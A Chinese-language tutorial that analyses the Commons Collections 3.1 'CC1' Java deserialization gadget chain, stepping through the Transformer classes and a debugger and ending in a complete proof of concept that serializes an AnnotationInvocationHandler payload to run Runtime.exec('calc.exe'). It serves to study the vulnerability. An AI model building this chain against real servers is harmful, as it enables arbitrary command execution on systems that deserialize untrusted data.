# Java安全反序列化之CC1链的分析与利用

## 1\. 环境

common-collection 3.1版本 jdk1.7版本下的POC复现

在Java 8u71以后的版本中，由于 sun.reflect.annotation.AnnotationInvocationHandler
发生了变化导致不再可用

## 2\. 前置知识

### **关于Commons Collections:**

官网描述：

> The [Java Collections
> Framework](http://docs.oracle.com/javase/tutorial/collections/) was a major
> addition in JDK 1.2. It added many powerful data structures that accelerate
> development of most significant Java applications. Since that time it has
> become the recognised standard for collection handling in Java.

Apache Commons
Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类

### **关于接口Transformer:**

在`org.apache.commons.collections`包中

    
    
    // 定义为将一个对象转换为另一个对象的类实现的接口函数
    public interface Transformer
    
    // 接口方法
    // 将input对象转化成某个对象输出
    Object transform(Object input)
    

### **关于类ConstantTransformer:**

在`org.apache.commons.collections.functors`包中

    
    
    // 将输入的对象转换为一个固定的常量对象
    public class ConstantTransformer
    extends Object
    implements Transformer, Serializable
    
    // 构造方法
    ConstantTransformer(Object constantToReturn)
    
    // 类方法
    public Object transform(Object input)
    

### **关于类InvokerTransformer:**

在`org.apache.commons.collections.functors`包中

    
    
    // 通过反射调用对象的方法或读取对象的属性来进行转换操作
    public class InvokerTransformer
    extends Object
    implements Transformer, Serializable
    
    // 构造函数
    InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)
    
    // 类方法
    public Object transform(Object input)
    

### **关于类ChainedTransformer:**

在`org.apache.commons.collections.functors`包中

    
    
    // 将多个Transformer组合起来，形成一个转换链，依次对输入对象进行转换操作
    public class ChainedTransformer
    extends Object
    implements Transformer, Serializable
    
    // 构造方法
    ChainedTransformer(Transformer[] transformers)
    
    // 类方法
    public Object transform(Object object)
    

### **关于类TransformedMap:**

在`org.apache.commons.collections.map`包中

    
    
    // 在对Map中的数据进行读取或写入时，自动使用指定的Transformer对数据进行转换操作
    public class TransformedMap
    extends AbstractMapDecorator
    implements Serializable
    
    // 构造方法
    TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer)
    
    // 类方法
    // 创建了一个新的Map对象，它会自动使用该Transformer对读取和写入的数据进行转换操作
    public static Map decorate(Map map,
               Transformer keyTransformer,
               Transformer valueTransformer)
    

## 3\. 调用链分析

POC代码：

    
    
    package ysoserial;
    
    import org.apache.commons.collections.*;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    
    import java.util.HashMap;
    import java.util.Map;
    
    public class commons_collections1 {
    
        public static void main(String[] args) throws Exception {
            //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
            Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
            };
    
            //将transformers数组存入ChaniedTransformer这个继承类
            Transformer transformerChain = new ChainedTransformer(transformers);
    
            //创建Map并绑定transformerChina
            Map innerMap = new HashMap();
            innerMap.put("value", "value");
            //给予map数据转化链
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    
            //触发漏洞
            Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
            //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式
            onlyElement.setValue("foobar");
        }
    }
    

执行该POC后成功弹出计算器，表示该POC在当前环境下可利用

两种调用栈：

    
    
    transform:76, ConstantTransformer (org.apache.commons.collections.functors)
    transform:122, ChainedTransformer (org.apache.commons.collections.functors)
    checkSetValue:169, TransformedMap (org.apache.commons.collections.map)
    setValue:191, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)
    main:35, commons_collections1 (ysoserial)
    
    
    transform:119, InvokerTransformer (org.apache.commons.collections.functors)
    transform:122, ChainedTransformer (org.apache.commons.collections.functors)
    checkSetValue:169, TransformedMap (org.apache.commons.collections.map)
    setValue:191, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)
    main:35, commons_collections1 (ysoserial)

根据调用栈分析：

**onlyElement.setValue("foobar");**

经过上面调试，onlyElement是`AbstracInputCheckedMapDecorator$MapEntry`对象，进入其setValue函数

    
    
    public Object setValue(Object value) {
        value = this.parent.checkSetValue(value);
        return super.entry.setValue(value);
    }
    

其中this.parent是`TransformedMap`对象，进入TransformedMap的checkSetValue方法

**checkSetValue**

    
    
    protected Object checkSetValue(Object value) {
        return this.valueTransformer.transform(value);
    }
    

此时的this.valueTransformer是`ChainedTransformer`对象

![](./img/1268158674182952559.png)

**ChainedTransformer中transform方法**

    
    
    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }
    
        return object;
    }
    

循环iTransformers中的对象调用其transform方法，最终返回object对象

**注：** 在ChainedTransformer中transform方法中起到对象拼接的作用

**F7步入循环的第一步**

来到了ConstantTransformer对象的transform方法

    
    
    public Object transform(Object input) {
        return this.iConstant;
    }
    

![](./img/2201087480880000322.png)

此时的this.iConstant是class.java.lang.Runtime类，执行完后object也是class.java.lang.Runtime类

**F7步入循环第二步**

来到了InvokerTransformer对象的transform方法

    
    
    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                // 获取input对象的class
                Class cls = input.getClass();
                // 根据参数获取class的Method方法对象
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                // 调用这个方法
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
    

![](./img/3367699765544852909.png)

此时object是Method对象：`public static java.lang.Runtime
java.lang.Runtime.getRuntime()`

**F7步入循环第三步**

再次来到来到了InvokerTransformer对象的transform方法

![](./img/8849877337762674054.png)

此时object是Runtime对象

**F7步入循环第四步**

再次来到来到了InvokerTransformer对象的transform方法

![](./img/3512953777904248462.png)

执行完此时object是Runtime对象，并且弹出计算器，命令执行成功

## 4\. 回看POC构造

目的：执行`Runtime.getRuntime().exec("calc.exe")`

通用反射机制语句：

    
    
    Class.forName("java.lang.Runtime")
    .getMethod("exec", String.class)
    .invoke(
    Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))
    ,
    "calc.exe"
    )
    

在此之前观察InvokerTransformer类的构造函数和transform的关键代码：

    
    
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
    
    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                // 获取input对象的class
                Class cls = input.getClass();
                // 根据参数获取class的Method方法对象
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                // 调用这个方法
                return method.invoke(input, this.iArgs);
            }
            ....
        }
    }
    

**反射机制中的第一个invoke**

根据InvokerTransformer中的代码可以得到其构造函数的参数：

    
    
    input = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))
    this.iMethodNam = "exec"
    this.iParamTypes = String.class
    this.iArgs = "calc.exe"

由此得到

    
    
    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
    

目前将焦点转移至`Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))`

**第二步**

由于input没有办法输入，因此需要借组ChainedTransformer进行拼接

要点：关于input.getClass()方法

>   * 当input是一个类的实例对象时，获取到的是这个类
>   * 当input是一个类时，获取到的是java.lang.Class
>

最终目标：`Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))`

它等价于对象`Runtime.getRuntime()`，其通过getClass方法得到class java.lang.Runtime

于是得到

    
    
    Transformer[] transformers = new Transformer[] {
        //以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例
        // new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),
        new ConstantTransformer(Runtime.getRuntime()),
        new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    transformerChain.transform(null);
    

但是Runtime类的定义没有继承`Serializable`类，所以是不支持反序列化的，就需要想办法在服务端生成Runtime对象

**第三步**

Runtime对象是通过`Runtime.getRuntime()`得到的，`InvokerTransformer`里面的反射机制可以执行任意函数，查看getRuntime()函数

    
    
    public static Runtime getRuntime() {
        return currentRuntime;
    }
    

而如果需要得到getRuntime()方法对象，则需要input为Runtime实例，回到我们需要解决的问题之上

由于在transform中的getClass方法中不能得到class Runtime，只能得到java.lang.Class

可以借助其getMethod类，由于getMethod类存在于Class类中

**重新梳理：**

目的：获取Runtime实例，即`Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")`

先获取getRuntime方法对象，即目标：`Class.forName("java.lang.Runtime").getMethod("getRuntime")`

由于没有办法获取到java.lang.Runtime，故更改为java.lang.Class开头，转换成如下语句

    
    
    //目标语句
    Class.forName("java.lang.Runtime").getMethod("getRuntime")
    //使用java.lang.Class开头
    Class.forName("java.lang.Class").getMethod("getMethod", new Class[] {String.class, Class[].class })
            .invoke(Class.forName("java.lang.Runtime"),"getRuntime",new Class[0]);

根据InvokerTransformer中的代码可以得到其构造函数的参数：

    
    
    input = java.lang.Class
    this.iMethodNam = "getMethod"
    this.iParamTypes = new Class[] {String.class, Class[].class }
    this.iArgs = new Object[] {"getRuntime", new Class[0] }

由此得到

    
    
    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] })

得到了getRuntime方法对象对象后，需要执行其方法，下一个input输入是上一个input输出，即getRuntime对象实例

    
    
    // input java.lang.Runtime.getRuntime() 
    Class cls = input.getClass();
    // cls = java.lang.reflect.Method
    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
    // 现在getMethod的方法名为invoke，其参数也是根据invoke方法而定的
    return method.invoke(input, this.iArgs);
    

`invoke方法.invoke(input, this.iArgs)`实际上等于`input.invoke(this.iArgs)`

现在的input是getRuntime对象实例，故只需要填写this.iArgs即可

getRuntime是个静态函数，不需要参数，传入null即可

    
    
    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] })
    

整合起来：

    
    
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
    };
    

参考中有一张很好的图：

![](./img/3204203593421451217.png)

**为什么要使用TransformedMap**

上面构造了ChainedTransformer对象，如果现在需要利用，则客户端将ChainedTransformer对象序列化输出至文件，服务端使用读取文件，使用readObject将文件中的内容反序列化成ChainedTransformer对象，为了能够触发命令执行，还需要这个对象调用transform，显然以上情况在服务端是不可能存在的，故需要借助在服务端的一种普遍操作来达到目的

现在有的是ChainedTransformer对象，即一个转换链， **TransformedMap**
类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload

这样命令执行的触发条件从调用transform函数转变成修改map中的值

TransformedMap中的静态方法decorate

    
    
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
    

这样就有了POC的以下部分

    
    
    //将transformers数组存入ChaniedTransformer这个继承类
    Transformer transformerChain = new ChainedTransformer(transformers);
    
    //创建Map并绑定transformerChina
    Map innerMap = new HashMap();
    innerMap.put("value", "value");
    //给予map数据转化链
    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    

**AnnotationInvocationHandler的readObject**

现在的POC得到的是一个Map对象，客户端将Map对象序列化后输入到文件中，服务端需要从文件中读取内容借助readObject反序列化成Map对象，然后对其值进行修改操作，这样才有可能命令执行，达到目的。现在需要找到一个类，在反序列化readObject逻辑中有写入操作从而触发命令执行

AnnotationInvocationHandler的构造函数：

    
    
    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
            this.type = var1;
            this.memberValues = var2;
        } else {
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        }
    }
    

新增的POC代码：

    
    
    //反射机制调用AnnotationInvocationHandler类的构造函数
    Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
    //取消构造函数修饰符限制
    ctor.setAccessible(true);
    //获取AnnotationInvocationHandler类实例
    Object instance = ctor.newInstance(Target.class, outerMap);
    

执行完AnnotationInvocationHandler的构造函数后

![](./img/2935086571518722611.png)

此时的instance是AnnotationInvocationHandler对象，里面的类变量的值如上图所示

构造好AnnotationInvocationHandler对象后，对其进行序列化发给服务端，服务端接收后对其进行readObject方法，如下代码

    
    
    //payload序列化写入文件，模拟网络传输
    FileOutputStream f = new FileOutputStream("payload.bin");
    ObjectOutputStream fout = new ObjectOutputStream(f);
    fout.writeObject(instance);
    
    //2.服务端读取文件，反序列化，模拟网络传输
    FileInputStream fi = new FileInputStream("payload.bin");
    ObjectInputStream fin = new ObjectInputStream(fi);
    //服务端反序列化
    fin.readObject();
    

找到AnnotationInvocationHandler的readObject处下断点，执行到`fin.readObject();`步入，调用栈为

    
    
    readObject:427, AnnotationInvocationHandler (sun.reflect.annotation)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:57, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:606, Method (java.lang.reflect)
    invokeReadObject:1017, ObjectStreamClass (java.io)
    readSerialData:1893, ObjectInputStream (java.io)
    readOrdinaryObject:1798, ObjectInputStream (java.io)
    readObject0:1350, ObjectInputStream (java.io)
    readObject:370, ObjectInputStream (java.io)
    main:62, commons_collections1 (ysoserial)

查看AnnotationInvocationHandler的readObject函数

    
    
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        // 默认反序列化
        var1.defaultReadObject();
        AnnotationType var2 = null;
    
        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }
    
        Map var3 = var2.memberTypes();
        // 获取构造的map迭代器
        Iterator var4 = this.memberValues.entrySet().iterator();
    
        while(var4.hasNext()) {
            // 遍历map迭代器
            Map.Entry var5 = (Map.Entry)var4.next();
            // 获取key
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
    
    }
    

其中var1是ObjectInputStream对象

当逐步调试至执行到if语句里面的内容时，各字段的值如下：

![](./img/1239515525844581631.png)

此时的var2：

    
    
    Annotation Type:
       Member types: {value=class [Ljava.lang.annotation.ElementType;}
       Member defaults: {}
       Retention policy: RUNTIME
       Inherited: false

所以var3获取到为{value=class [Ljava.lang.annotation.ElementType;}

这里要执行到var5.setValue...需要满足var7!=null，需要满足的条件

  * sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X 
  * 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素

在获取AnnotationInvocationHandler类实例的POC中，第一个参数传入的是Target.class，其存在value方法，同时为了满足第二个条件，需要在Map中放入一个key为value的元素

最终模拟攻击代码：

    
    
    package ysoserial;
    
    import org.apache.commons.collections.*;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    // import sun.reflect.annotation.AnnotationInvocationHandler;
    
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Map;
    
    public class commons_collections1 {
    
        public static void main(String[] args) throws Exception {
            //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
            Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
            };
    
            //将transformers数组存入ChaniedTransformer这个继承类
            Transformer transformerChain = new ChainedTransformer(transformers);
    
            //创建Map并绑定transformerChina
            Map innerMap = new HashMap();
            innerMap.put("value", "value");
            //给予map数据转化链
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    
            // 服务端需要的操作
            //触发漏洞
            // Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
            //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式
            // onlyElement.setValue("foobar");
    
            //反射机制调用AnnotationInvocationHandler类的构造函数
            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            //取消构造函数修饰符限制
            ctor.setAccessible(true);
            //获取AnnotationInvocationHandler类实例
            Object instance = ctor.newInstance(Target.class, outerMap);
    
            //payload序列化写入文件，模拟网络传输
            FileOutputStream f = new FileOutputStream("payload.bin");
            ObjectOutputStream fout = new ObjectOutputStream(f);
            fout.writeObject(instance);
    
            //2.服务端读取文件，反序列化，模拟网络传输
            FileInputStream fi = new FileInputStream("payload.bin");
            ObjectInputStream fin = new ObjectInputStream(fi);
            //服务端反序列化
            fin.readObject();
        }
    }
    

## 5\. 参考

[JAVA反序列化 - Commons-Collections组件 - 先知社区
(aliyun.com)](https://xz.aliyun.com/t/7031)

[Java安全之Commons Collections1分析（一） - nice_0e3 - 博客园
(cnblogs.com)](https://www.cnblogs.com/nice0e3/p/13779857.html)

[Overview (Apache Commons Collections 3.2.2
API)](https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html)

